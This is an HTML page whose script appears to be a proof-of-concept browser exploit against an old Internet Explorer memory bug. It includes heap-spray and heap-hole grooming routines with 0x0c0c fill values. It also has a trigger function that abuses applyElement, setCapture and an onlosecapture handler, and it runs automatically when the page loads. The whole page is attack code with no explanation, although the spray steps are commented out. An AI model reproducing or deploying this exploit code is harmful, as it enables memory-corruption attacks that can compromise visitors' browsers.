<html>
	<meta http-equiv="cache-control" content="max-age=0" />
	<meta http-equiv="cache-control" content="no-cache" />
	<meta http-equiv="expires" content="0" />
	<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
	<meta http-equiv="pragma" content="no-cache" />
	<script>
		var heap = new Array(0x50000);
		function spray() {
			s = unescape("%u4141%u4141");
			while(s.length < 0x1200) s += s;

			s = s.substr(0, s.length);
			for(i = 0; i < 0x10000; i++) {
				heap[i] = document.createElement('div');
				heap[i].className = s.substr(0, (0x1000 - 6) / 2);
			}
		}

		var hole_size  = 0x88;
		var hole_count = 0x5000;

		function createHoles() {
			var arr   = new Array();
			var str   = unescape("%u4141%u4141");

			while(str.length <= hole_size) str += str;
			for(i = 0; i < hole_count; i++) {
				s = str.substr(0, (hole_size - 6) / 2);
				arr[i] = document.createElement('div');
				arr[i].className = s;
			}

			for(i = 0; i < (hole_count / 2); i++)
				arr[i].className = '';
		}

		function fillHoles() {
			var arr   = new Array();
			var fill  = unescape("%u0c0c%u0c0c");

			while(fill.length <= hole_size) fill += fill;
			for(i = 0; i < hole_count; i++) {
				s = fill.substr(0, (hole_size - 6) / 2);
				arr[i] = document.createElement('div');
				arr[i].setAttribute('title', s);
			}
		}

		function trigger() {
			id0 = document.createElement("sup");
			id1 = document.createElement("audio");

			document.body.appendChild(id0);
			document.body.appendChild(id1);

			id1.applyElement(id0);

			id0.onlosecapture = function(e) {
				document.write("");
				fillHoles();
			}

			id0['outerText'] = "";
			id0.setCapture();
			id1.setCapture();
		}

		window.onload = function() { 
			//spray();
			//createHoles();
			trigger(); 
		}
	</script>
</html>
